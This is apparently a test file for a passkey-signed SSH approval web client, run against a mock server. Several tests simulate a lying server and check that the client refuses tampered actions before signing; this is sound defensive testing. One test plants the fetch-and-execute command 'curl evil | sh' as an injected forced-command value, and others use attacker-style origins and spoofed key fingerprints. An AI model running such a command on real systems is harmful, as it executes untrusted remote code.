// Main flows end to end against the mock server (DOM-free).
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { ApiError, createApi, type Api } from "../src/api";
import { encode } from "../src/b64url";
import {
  FlowError,
  PASSKEY_TARGET,
  authorizeAddPasskey,
  completeAction,
  completeLogin,
  completeRegistration,
  explainError,
  nothingChanged,
  prepareAction,
  prepareLogin,
  prepareRegistrationWithCode,
  nicknameProblem,
  targetForGrant,
  targetForPasskey,
  targetForPending,
  targetForStanding,
} from "../src/flows";
import { canonicalJSON, startMock } from "../mock/server";
import type { ChallengeResponse, PasskeyChange, PasskeyInfo } from "../src/types";
import { fakeAuth, jarFetch } from "./helpers";

type Mock = ReturnType<typeof startMock>;

async function signedIn(m: Mock) {
  const f = jarFetch();
  const api = createApi({ base: m.url, fetch: f });
  const auth = fakeAuth(m.url);
  await completeLogin(api, auth, await prepareLogin(api));
  return { api, auth, f };
}

describe("seeded mock", () => {
  let m: Mock;
  beforeAll(() => {
    m = startMock({ port: 0, distDir: null });
  });
  afterAll(() => m.stop());

  test("state needs a session", async () => {
    const api = createApi({ base: m.url, fetch: jarFetch() });
    const e = await api.state().catch((x) => x);
    expect(e).toBeInstanceOf(ApiError);
    expect((e as ApiError).code).toBe("unauthenticated");
    expect(explainError(e)).toMatch(/signed out/);
  });

  test("POSTs without X-Aqmas or with a non-JSON type are refused", async () => {
    let r = await fetch(`${m.url}/api/ui/login/begin`, { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" });
    expect(r.status).toBe(403);
    r = await fetch(`${m.url}/api/ui/login/begin`, { method: "POST", headers: { "X-Aqmas": "1", "Content-Type": "text/plain" }, body: "{}" });
    expect(r.status).toBe(415);
    r = await fetch(`${m.url}/api/ui/login/begin`, { method: "POST", headers: { "X-Aqmas": "1", "Content-Type": "application/json", Origin: "https://evil.example" }, body: "{}" });
    expect(r.status).toBe(403);
  });

  test("login, then every request carries the CSRF header, JSON type and same-origin credentials", async () => {
    const { api, f } = await signedIn(m);
    const s = await api.state();
    expect(s.owner.name).toBe("alice");
    expect(s.pending!.length).toBeGreaterThanOrEqual(3);
    const posts = f.log.filter((x) => x.method === "POST");
    expect(posts.length).toBe(2);
    for (const p of f.log) expect(p.credentials).toBe("same-origin");
    for (const p of posts) {
      expect(p.headers.get("X-Aqmas")).toBe("1");
      expect(p.headers.get("Content-Type")).toBe("application/json");
    }
    // login/finish sent {challenge_id, assertion} with the go-webauthn fields.
    const fin = posts[1]!.body as { challenge_id: string; assertion: { response: Record<string, string> } };
    expect(typeof fin.challenge_id).toBe("string");
    expect(Object.keys(fin.assertion.response).sort()).toEqual(["authenticatorData", "clientDataJSON", "signature", "userHandle"]);
  });

  test("approve SSH with a shorter TTL and a 4 h standing approval", async () => {
    const { api, auth, f } = await signedIn(m);
    const s = await api.state();
    const item = s.pending!.find((p) => p.id === "01JDEMO0SSH0DB1XXX0000001")!;
    const prep = await prepareAction(api, targetForPending(item), { action: "approve", ttl_seconds: 3600, standing_hours: 4 });
    expect(prep.description.headline).toBe("Approve SSH as alice@db-1 for 1 hour, requested by web-1.");
    expect(prep.description.standing).toBe("Also auto-approve the same request (web-1 to alice@db-1) for the next 4 hours.");
    // The challenge the passkey signs is SHA-256(canonical).
    const digest = new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(prep.canonicalText)));
    expect(encode(prep.options.challenge as ArrayBuffer)).toBe(encode(digest));
    expect(auth.gets.length).toBe(1); // only the login so far: nothing signed before confirm

    const res = (await completeAction(api, auth, prep)) as { status: string; grant?: { not_after: string } };
    expect(res.status).toBe("approved");
    const decide = f.log.at(-1)!;
    expect(decide.url).toEndWith(`/api/ui/requests/${item.id}/decide`);
    expect(decide.headers.get("X-Aqmas")).toBe("1");
    expect(Object.keys(decide.body as object).sort()).toEqual(["assertion", "challenge_id"]);

    const applied = m.store.applied.at(-1)!;
    expect(applied.canonical).toMatchObject({ action: "approve", ttl_seconds: 3600, standing_hours: 4, target: "db-1", login_user: "alice" });
    const after = await api.state();
    expect(after.pending!.some((p) => p.id === item.id)).toBe(false);
    expect(after.grants!.some((g) => g.target_host === "db-1" && g.requesting_host === "web-1")).toBe(true);
    expect(after.standing!.some((x) => x.target_host === "db-1" && x.requesting_host === "web-1")).toBe(true);

    // The challenge is single use.
    const again = await completeAction(api, auth, prep).catch((x) => x);
    expect(again).toBeInstanceOf(ApiError);
    expect((again as ApiError).code).toBe("conflict");
  });

  test("deny (also passkey-signed)", async () => {
    const { api, auth } = await signedIn(m);
    const item = (await api.state()).pending!.find((p) => p.id === "01JDEMO0SSH0ROOT00000002")!;
    const prep = await prepareAction(api, targetForPending(item), { action: "deny" });
    expect(prep.description.headline).toBe("Deny SSH as root@laptop-2, requested by build-box.");
    expect(prep.canonical.standing_hours ?? 0).toBe(0);
    const res = (await completeAction(api, auth, prep)) as { status: string };
    expect(res.status).toBe("denied");
  });

  test("enrollment approve", async () => {
    const { api, auth } = await signedIn(m);
    const item = (await api.state()).pending!.find((p) => p.kind === "enrollment")!;
    const prep = await prepareAction(api, targetForPending(item), { action: "approve" });
    expect(prep.description.headline).toBe("Let kiosk-3 join the fleet as a trusted host.");
    const res = (await completeAction(api, auth, prep)) as { status: string };
    expect(res.status).toBe("approved");
    expect((await api.state()).pending!.some((p) => p.id === item.id)).toBe(false);
  });

  test("revoke a standing approval and a grant", async () => {
    const { api, auth } = await signedIn(m);
    let s = await api.state();
    const st = s.standing!.find((x) => x.id === "01JDEMO0STANDING000000004")!;
    let prep = await prepareAction(api, targetForStanding(st), { action: "revoke" });
    expect(prep.description.headline).toBe("Stop auto-approving SSH as alice@build-box for web-1.");
    await completeAction(api, auth, prep);
    const g = s.grants!.find((x) => x.id === "01JDEMO0GRANT00000000006")!;
    prep = await prepareAction(api, targetForGrant(g), { action: "revoke" });
    expect(prep.description.headline).toBe("Revoke laptop-2's SSH access as alice@web-1.");
    await completeAction(api, auth, prep);
    s = await api.state();
    expect(s.standing!.some((x) => x.id === st.id)).toBe(false);
    expect(s.grants!.some((x) => x.id === g.id)).toBe(false);
  });

  test("an assertion over a different challenge is refused by the server", async () => {
    const { api, auth } = await signedIn(m);
    const item = m.store.spawnRequest();
    const prep = await prepareAction(api, targetForPending(item), { action: "approve", ttl_seconds: 900 });
    auth.forceChallenge = new Uint8Array(32).buffer;
    const e = await completeAction(api, auth, prep).catch((x) => x);
    expect((e as ApiError).code).toBe("forbidden");
  });

  test("an expired challenge is refused", async () => {
    const { api, auth } = await signedIn(m);
    const item = m.store.spawnRequest();
    const prep = await prepareAction(api, targetForPending(item), { action: "deny" });
    m.store.challenges.get(prep.challengeId)!.expiresAt = Date.now() - 1;
    const e = await completeAction(api, auth, prep).catch((x) => x);
    expect((e as ApiError).code).toBe("expired");
  });

  test("add a passkey: signed passkey:add unlocks registration", async () => {
    const { api, auth } = await signedIn(m);
    const before = (await api.state()).owner.passkeys;
    const prep = await prepareAction(api, PASSKEY_TARGET, { action: "add" });
    expect(prep.description.headline).toBe("Allow adding a new passkey to aqmas (named after its authenticator).");
    const reg = await authorizeAddPasskey(api, auth, prep);
    await completeRegistration(api, auth, reg);
    expect((await api.state()).owner.passkeys).toBe(before + 1);
    // A chosen nickname is part of the signed add text (normalised like the server does).
    const named = await prepareAction(api, PASSKEY_TARGET, { action: "add", nickname: " Desk\u00a0 key " });
    expect(named.canonical).toMatchObject({ action: "add", nickname: "", new_nickname: "Desk key" });
    expect(named.description.headline).toBe("Allow adding a new passkey named Desk key to aqmas.");
    await expect(prepareAction(api, PASSKEY_TARGET, { action: "add", nickname: "Cafe\u0301" })).rejects.toThrow(FlowError);
    // register/begin without an enroll code or a signed challenge is refused.
    const e = await api.registerBegin({}).catch((x) => x);
    expect(e).toBeInstanceOf(ApiError);
  });
});

describe("a lying or buggy server is caught before anything is signed", () => {
  let m: Mock;
  beforeAll(() => {
    m = startMock({ port: 0, distDir: null });
  });
  afterAll(() => m.stop());

  async function tampered(edit: (r: ChallengeResponse) => Promise<ChallengeResponse> | ChallengeResponse) {
    const { api, auth } = await signedIn(m);
    const evil: Api = { ...api, challenge: async (o, id, b) => edit(await api.challenge(o, id, b)) };
    const item = m.store.spawnRequest({ ttl_requested: 1800 });
    const e = await prepareAction(evil, targetForPending(item), { action: "approve", ttl_seconds: 1800 }).catch((x) => x);
    expect(e).toBeInstanceOf(FlowError);
    expect(auth.gets.length).toBe(1); // only the login: no passkey prompt for the bad action
    return e as FlowError;
  }

  const sha = async (t: string) => encode(new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(t))));
  const rewrite = async (r: ChallengeResponse, change: Record<string, unknown>) => {
    const text = canonicalJSON({ ...JSON.parse(r.canonical), ...change });
    const pk = (r.public_key as { publicKey: Record<string, unknown> }).publicKey;
    return { ...r, canonical: text, public_key: { publicKey: { ...pk, challenge: await sha(text) } } };
  };

  test("passkey add: a dropped or swapped nickname is refused before signing", async () => {
    const { api, auth } = await signedIn(m);
    const swap = (nn: string): Api => ({ ...api, challenge: async (o, id, b) => rewrite(await api.challenge(o, id, b), { new_nickname: nn }) });
    for (const [chosen, served] of [["Desk key", ""], ["Desk key", "Attacker key"], ["", "Desk key"]] as const) {
      const e = await prepareAction(swap(served), PASSKEY_TARGET, { action: "add", nickname: chosen }).catch((x) => x);
      expect(e).toBeInstanceOf(FlowError);
      expect((e as FlowError).message).toMatch(/new_nickname/);
    }
    expect(auth.gets.length).toBe(1); // only the login
  });

  test("longer TTL than chosen (consistent canonical + challenge)", async () => {
    const e = await tampered((r) => rewrite(r, { ttl_seconds: 28800 }));
    expect(e.message).toMatch(/ttl_seconds/);
  });

  test("sneaked-in standing approval", async () => {
    expect((await tampered((r) => rewrite(r, { standing_hours: 8 }))).message).toMatch(/standing_hours/);
  });

  test("different target or user", async () => {
    expect((await tampered((r) => rewrite(r, { login_user: "root" }))).message).toMatch(/login_user/);
    expect((await tampered((r) => rewrite(r, { target: "gw-host-2" }))).message).toMatch(/target/);
  });

  test("shown canonical differs from the signed challenge", async () => {
    const e = await tampered((r) => ({ ...r, canonical: canonicalJSON({ ...JSON.parse(r.canonical), nonce: "other" }) }));
    expect(e.message).toMatch(/challenge does not match/);
  });

  test("a field the page can't show (e.g. a forced command)", async () => {
    const e = await tampered((r) => rewrite(r, { force_command: "curl evil | sh" }));
    expect(e.message).toMatch(/force_command/);
  });

  test("non-canonical text (duplicate key)", async () => {
    const e = await tampered((r) => ({ ...r, canonical: r.canonical.replace('"action":"approve"', '"action":"deny","action":"approve"') }));
    expect(e.message).toMatch(/canonical form/);
  });
});

describe("enrollment checks", () => {
  test("the client key and the replace flag must match the card", async () => {
    const m = startMock({ port: 0, distDir: null });
    try {
      const { api } = await signedIn(m);
      const item = (await api.state()).pending!.find((p) => p.kind === "enrollment")!;
      const sha = async (t: string) => encode(new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(t))));
      for (const change of [{ key_fingerprint: "SHA256:attacker" }, { replaces: true }]) {
        const evil: Api = {
          ...api,
          challenge: async (o, id, b) => {
            const r = await api.challenge(o, id, b);
            const text = canonicalJSON({ ...JSON.parse(r.canonical), ...change });
            const pk = (r.public_key as { publicKey: Record<string, unknown> }).publicKey;
            return { ...r, canonical: text, public_key: { publicKey: { ...pk, challenge: await sha(text) } } };
          },
        };
        const e = await prepareAction(evil, targetForPending(item), { action: "approve" }).catch((x) => x);
        expect(e).toBeInstanceOf(FlowError);
      }
    } finally {
      m.stop();
    }
  });
});

describe("error outcomes", () => {
  test("only refusals before signing, cancelled prompts and 4xx count as 'nothing changed'", () => {
    expect(nothingChanged(new FlowError("x"))).toBe(true);
    expect(nothingChanged(new ApiError(409, "conflict", ""))).toBe(true);
    expect(nothingChanged(Object.assign(new Error("x"), { name: "NotAllowedError" }))).toBe(true);
    expect(nothingChanged(new ApiError(500, "internal", ""))).toBe(false);
    expect(nothingChanged(new ApiError(524, "http_524", ""))).toBe(false);
    expect(nothingChanged(new ApiError(0, "network", ""))).toBe(false);
    expect(nothingChanged(new TypeError("Failed to fetch"))).toBe(false);
  });
});

describe("first run (no passkey yet)", () => {
  let m: Mock;
  beforeAll(() => {
    m = startMock({ port: 0, distDir: null, fresh: true, enrollCode: "424242" });
  });
  afterAll(() => m.stop());

  test("login is impossible, the enroll code registers, then login works", async () => {
    const f = jarFetch();
    const api = createApi({ base: m.url, fetch: f });
    const auth = fakeAuth(m.url);
    const e = await prepareLogin(api).catch((x) => x);
    expect((e as ApiError).code).toBe("conflict");

    expect(await prepareRegistrationWithCode(api, "  ").catch((x) => x)).toBeInstanceOf(FlowError);
    expect(((await prepareRegistrationWithCode(api, "000000").catch((x) => x)) as ApiError).code).toBe("forbidden");

    const reg = await prepareRegistrationWithCode(api, " 424242 ");
    expect(reg.options.authenticatorSelection?.residentKey).toBe("required");
    await completeRegistration(api, auth, reg);
    const fin = f.log.at(-1)!.body as { challenge_id: string; credential: { response: Record<string, unknown> } };
    expect(Object.keys(fin).sort()).toEqual(["challenge_id", "credential"]);
    expect(Object.keys(fin.credential.response).sort()).toEqual(["attestationObject", "clientDataJSON", "transports"]);

    // One-time code.
    expect(((await prepareRegistrationWithCode(api, "424242").catch((x) => x)) as ApiError).code).toBe("forbidden");

    await completeLogin(api, auth, await prepareLogin(api));
    expect((await api.state()).owner.passkeys).toBe(1);
  });
});

describe("server without the grants field", () => {
  test("state has no grants key; UI treats it as unknown, not empty", async () => {
    const m = startMock({ port: 0, distDir: null, grants: false });
    try {
      const { api } = await signedIn(m);
      const s = await api.state();
      expect("grants" in s).toBe(false);
    } finally {
      m.stop();
    }
  });
});

describe("passkey management", () => {
  let m: Mock;
  beforeAll(() => {
    m = startMock({ port: 0, distDir: null });
  });
  afterAll(() => m.stop());

  const byName = async (api: Api, n: string) => ((await api.state()).passkeys ?? []).find((p) => p.nickname === n) as PasskeyInfo;

  test("state lists passkeys; the session's own is current", async () => {
    const { api } = await signedIn(m);
    const list = (await api.state()).passkeys!;
    expect(list.map((p) => p.nickname)).toEqual(["iPhone", "Bitwarden", "YubiKey on keyring"]);
    expect(list.filter((p) => p.current).length).toBe(1);
    expect(list.find((p) => p.nickname === "YubiKey on keyring")!.backup_eligible).toBe(false);
    for (const p of list) expect(p.id).toMatch(/^[0-9a-f]{32}$/);
  });

  test("rename: canonical carries both names, the rename endpoint applies it", async () => {
    const { api, auth, f } = await signedIn(m);
    const yk = await byName(api, "YubiKey on keyring");
    const prep = await prepareAction(api, targetForPasskey(yk), { action: "rename", nickname: "  YubiKey C (desk) " });
    expect(prep.canonical).toMatchObject({ object: "passkey", action: "rename", id: yk.id, nickname: "YubiKey on keyring", new_nickname: "YubiKey C (desk)" });
    expect(prep.description.headline).toBe(`Rename the passkey YubiKey on keyring (id ${yk.id.slice(-6).toUpperCase()}) to YubiKey C (desk).`);
    const res = (await completeAction(api, auth, prep)) as PasskeyChange;
    expect(f.log.at(-1)!.url).toEndWith(`/api/ui/passkeys/${yk.id}/rename`);
    expect(res).toMatchObject({ ok: true, action: "rename", nickname: "YubiKey C (desk)", signed_out: false });
    expect(await byName(api, "YubiKey C (desk)")).toBeDefined();
  });

  test("rename refusals: bad names locally, duplicates by the server", async () => {
    const { api } = await signedIn(m);
    const bw = await byName(api, "Bitwarden");
    expect(nicknameProblem("")).not.toBeNull();
    expect(nicknameProblem("x".repeat(65))).not.toBeNull();
    expect(nicknameProblem("evil\u202Ename")).not.toBeNull();
    expect(nicknameProblem("Phone (work)")).toBeNull();
    expect(await prepareAction(api, targetForPasskey(bw), { action: "rename", nickname: "a\u200Bb" }).catch((x) => x)).toBeInstanceOf(FlowError);
    const dup = (await prepareAction(api, targetForPasskey(bw), { action: "rename", nickname: "iphone" }).catch((x) => x)) as ApiError;
    expect(dup.code).toBe("conflict");
  });

  test("a server that names another passkey, another new name, or another action is refused before signing", async () => {
    const { api, auth } = await signedIn(m);
    const bw = await byName(api, "Bitwarden");
    const sha = async (t: string) => encode(new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(t))));
    const evilApi = (change: Record<string, unknown>): Api => ({
      ...api,
      challenge: async (o, id, b) => {
        const r = await api.challenge(o, id, b);
        const text = canonicalJSON({ ...JSON.parse(r.canonical), ...change });
        const pk = (r.public_key as { publicKey: Record<string, unknown> }).publicKey;
        return { ...r, canonical: text, public_key: { publicKey: { ...pk, challenge: await sha(text) } } };
      },
    });
    const gets = auth.gets.length;
    for (const change of [{ nickname: "iPhone" }, { new_nickname: "Attacker key" }, { action: "remove", new_nickname: "" }, { id: "0".repeat(32) }]) {
      const e = await prepareAction(evilApi(change), targetForPasskey(bw), { action: "rename", nickname: "Bitwarden (laptop)" }).catch((x) => x);
      expect({ change, err: e instanceof FlowError }).toEqual({ change, err: true });
    }
    // Remove chosen, but the server slipped in a rename.
    const e = await prepareAction(evilApi({ action: "rename", new_nickname: "x" }), targetForPasskey(bw), { action: "remove" }).catch((x) => x);
    expect(e).toBeInstanceOf(FlowError);
    expect(auth.gets.length).toBe(gets); // no passkey prompt for any of them
  });

  test("a rename assertion can't be applied as a remove (server checks the verb)", async () => {
    const { api, auth } = await signedIn(m);
    const bw = await byName(api, "Bitwarden");
    const prep = await prepareAction(api, targetForPasskey(bw), { action: "rename", nickname: "Bitwarden (laptop)" });
    const cred = await auth.get(prep.options);
    const { encodeAssertion } = await import("../src/webauthn");
    const e = (await api.apply("passkey", bw.id, prep.challengeId, encodeAssertion(cred), "remove").catch((x) => x)) as ApiError;
    expect(e).toBeInstanceOf(ApiError);
    expect(e.status).toBe(400);
    expect(await byName(api, "Bitwarden")).toBeDefined();
  });

  test("remove another passkey, then the one signed in with (signed out), and never the last", async () => {
    const { api, auth } = await signedIn(m);
    const bw = await byName(api, "Bitwarden");
    let prep = await prepareAction(api, targetForPasskey(bw), { action: "remove" });
    expect(prep.canonical).toMatchObject({ action: "remove", nickname: "Bitwarden", new_nickname: "" });
    expect(prep.description.headline).toBe(`Remove the passkey Bitwarden (id ${bw.id.slice(-6).toUpperCase()}). It can no longer sign in or approve anything.`);
    let res = (await completeAction(api, auth, prep)) as PasskeyChange;
    expect(res).toMatchObject({ action: "remove", signed_out: false });

    const current = (await api.state()).passkeys!.find((p) => p.current)!;
    prep = await prepareAction(api, targetForPasskey(current), { action: "remove" });
    res = (await completeAction(api, auth, prep)) as PasskeyChange;
    expect(res.signed_out).toBe(true);
    expect(((await api.state().catch((x) => x)) as ApiError).code).toBe("unauthenticated");

    const again = await signedIn(m);
    const last = (await again.api.state()).passkeys!;
    expect(last.length).toBe(1);
    const e = (await prepareAction(again.api, targetForPasskey(last[0]!), { action: "remove" }).catch((x) => x)) as ApiError;
    expect(e.code).toBe("conflict");
  });

  test("adding with a nickname: it is signed, and register/finish can't change it", async () => {
    const { api, auth } = await signedIn(m);
    let prep = await prepareAction(api, PASSKEY_TARGET, { action: "add", nickname: " Work laptop " });
    expect(prep.canonical).toMatchObject({ nickname: "", new_nickname: "Work laptop" });
    let reg = await authorizeAddPasskey(api, auth, prep);
    const e = (await completeRegistration(api, auth, reg, "Something else").catch((x) => x)) as ApiError;
    expect(e.status).toBe(400);
    prep = await prepareAction(api, PASSKEY_TARGET, { action: "add", nickname: " Work laptop " });
    reg = await authorizeAddPasskey(api, auth, prep);
    const res = (await completeRegistration(api, auth, reg)) as { passkey: PasskeyInfo };
    expect(res.passkey.nickname).toBe("Work laptop");
    // A server that drops or swaps the chosen name is refused before signing.
    await expect(prepareAction(api, PASSKEY_TARGET, { action: "add", nickname: "Work laptop" })).rejects.toThrow(); // now taken: 409
  });
});
